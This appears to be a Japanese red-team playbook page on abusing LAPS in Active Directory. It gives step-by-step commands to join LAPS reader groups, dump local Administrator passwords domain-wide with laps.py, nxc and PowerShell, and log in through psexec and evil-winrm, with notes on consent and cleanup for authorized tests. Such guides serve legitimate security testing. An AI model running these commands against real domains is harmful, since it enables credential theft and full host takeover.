# LAPS 管理者パスワードの取得

> **スコープ**: LAPS（Local Administrator Password Solution）で管理されたローカル Administrator パスワードを取得する。グループ追加による読み取り権限昇格〜パスワード取得〜Administrator として接続まで扱う。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [ ] 業務停止リスク
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（LAPS パスワード読み取りは監査ログに残る）
>
> 実施可否は事前合意で明示確認すること。演習環境では制約なし。

## 着火条件

以下のいずれかが確認できた場合：

- BloodHound で、現在のユーザーが `LAPS Readers` / `LAPS ADM` 等の LAPS 読み取りグループに属している
- BloodHound / PowerShell で、現在のユーザーがそのグループに自分を追加できる権限（GenericAll / ForcePasswordChange 等）を持っている
- `Get-ADComputer` や `ldapsearch` で `ms-Mcs-AdmPwd` 属性が返ってくる

## 環境前提
- 実行環境: テスター端末（Linux 側 laps.py / nxc）または Windows シェル（PowerShell）
- 必要なツール: `laps.py`（Impacket に同梱されていない場合は `pip install laps.py` または GitHub から取得）/ `nxc`（標準搭載）/ `evil-winrm` / `psexec.py`（Impacket 付属）

## 先に確認すること

**LAPS が環境に導入されているかを先に確認する:**

```powershell
# [Target] LAPS が導入されているか確認（ms-Mcs-AdmPwd 属性の存在確認）
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name, ms-Mcs-AdmPwd | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null }
```

**攻撃者の思考トレース:** LAPS が導入されていれば、DC にローカル管理者パスワードが集中管理されている。「LAPS ADM / LAPS READ グループにメンバー追加できる」権限チェーンをたどることで、最終的にホストの Administrator パスワードを取得できる。

---

## 1. LAPS 読み取りグループへの自分の追加（権限がある場合）

**コマンド:**

```powershell
# [Target] PowerShell でグループに自分（または別のユーザー）を追加する
# $cred は操作可能な認証情報オブジェクト
Add-ADGroupMember -Identity 'LAPS Read' -Members [USER] -Credential $cred
Add-ADGroupMember -Identity 'LAPS ADM'  -Members [USER] -Credential $cred

# [Target] グループメンバーシップの確認
net user [USER] /domain | findstr /i "local"
```

> グループ名は環境によって異なる（`LAPS Readers` / `LAPS Read` / `LAPS_ADM` 等）。BloodHound で LAPS 関連グループのノードを確認する。

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| グループ追加成功 | LAPS 読み取り権限を取得 | §2 LAPS パスワードの取得へ |
| グループ追加成功後もパスワードが読めない | セッションのグループメンバーシップが未更新 | PSSession を再作成してから再試行 |

**注意（原状回復）:** 追加したグループメンバーシップを削除する（`Remove-ADGroupMember`）。

---

## 2. LAPS パスワードの取得

**コマンド（laps.py / nxc）:**

```bash
# [Attacker] laps.py でターゲットホストの Administrator パスワードを取得
python3 laps.py -u '[USER]' -p '[PASSWORD]' -d [DOMAIN] -l [TARGET_FQDN]
# → "Password: [PLAINTEXT_ADMIN_PASSWORD]" が出力される

# [Attacker] nxc でドメイン内の全ホストの LAPS パスワードを取得
nxc ldap [DC_IP] -u '[USER]' -p '[PASSWORD]' --laps
```

**コマンド（PowerShell）:**

```powershell
# [Target] LAPS パスワードの読み取り
Get-ADComputer [COMPUTERNAME] -Properties ms-Mcs-AdmPwd | Select-Object Name, ms-Mcs-AdmPwd

# [Target] ドメイン内全コンピューターの LAPS パスワードを一覧で確認
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
  Select-Object Name, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
  Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null }
```

**観測される出力 → 次のアクション:**

| 状況 | 次のアクション |
|------|--------------|
| LAPS パスワードが取得できた | §3 Administrator として接続へ |
| `ms-Mcs-AdmPwd` が空（null） | そのコンピューターは LAPS 管理外（手動管理または未設定）|
| アクセス拒否 | 読み取り権限がない → §1 でグループ追加。または BloodHound で権限チェーンを確認 |

---

## 3. 取得したパスワードでアクセス

**コマンド:**

```bash
# [Attacker] psexec で Administrator として接続
psexec.py [DOMAIN]/[ADMIN_USER]@[TARGET_IP]
# → パスワードプロンプトで LAPS パスワードを入力

# [Attacker] evil-winrm
evil-winrm -i [TARGET_IP] -u [ADMIN_USER] -p '[LAPS_PASSWORD]'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| Administrator シェルが取得できる | LAPS 悪用成功 | 「昇格成功後に確認すること」セクションへ |
| アクセスできない | ローカル Admin が無効化されている可能性 | `net localgroup Administrators` で確認 |

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| `ms-Mcs-AdmPwd` が返ってこない | LAPS 未導入。または読み取り権限がない → §1 でグループ追加 / BloodHound で権限チェーンを確認 |
| `laps.py` が見つからない | `pip install laps.py --break-system-packages` または `nxc --laps` で代替 |
| 取得したパスワードで Administrator としてアクセスできない | ローカル Admin が無効化されている可能性。`net localgroup Administrators` で確認 |

---

## 昇格成功後に確認すること（横展開観点）

Administrator として接続できたら：

- `whoami /priv` で SeDebugPrivilege 等の特権トークンを確認
- DCSync が必要な場合は → `Credential_Dumping.md`
- 他ホストへの同じ LAPS 読み取りを展開する場合は BloodHound で他コンピューターの ACL を確認

---

## 注意点・落とし穴

- LAPS パスワードは定期ローテーション（通常 30 日）されるため、取得後は速やかに使用する
- グループ追加後、現在の PSSession のグループメンバーシップはリフレッシュされない。新しいセッションを開くか PSSession を再作成する必要がある
- LAPS の読み取り対象は「コンピューターのローカル Administrator」。ドメイン管理者アカウントとは別物

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。ローカル管理者パスワードの取得はシステムへの完全アクセスを意味する
- **想定されるSIEM/EDR検知**: LAPS 属性読み取りの監査ログ（AD 監査設定が有効な場合）
- **業務影響リスク**: なし（読み取りのみ。パスワード変更はしない）
- **原状回復必須項目**: ✅ 追加したグループメンバーシップを削除（`Remove-ADGroupMember`）/ ✅ 取得した Administrator パスワードは暗号化保管 → テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：BloodHound で LAPS 読み取りグループへのアクセス権限を確認 → `../05_Tools_Reference/BloodHound.md`
- 前：ForcePasswordChange / GenericAll でユーザーを乗っ取り → LAPS グループに追加 → `ACE_Abuse/ForcePasswordChange.md` / `ACE_Abuse/GenericAll.md`
- 後：Administrator として DCSync → `Credential_Dumping.md`
- 後：psexec での接続 → `../05_Tools_Reference/Impacket_Suite.md`
